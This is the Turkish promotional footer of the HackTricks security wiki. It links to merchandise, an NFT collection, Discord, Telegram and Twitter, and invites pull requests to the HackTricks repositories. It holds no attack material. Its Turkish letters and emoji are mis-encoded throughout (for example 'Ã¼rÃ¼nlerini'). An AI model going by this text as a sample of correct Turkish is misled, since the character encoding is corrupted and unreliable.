* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
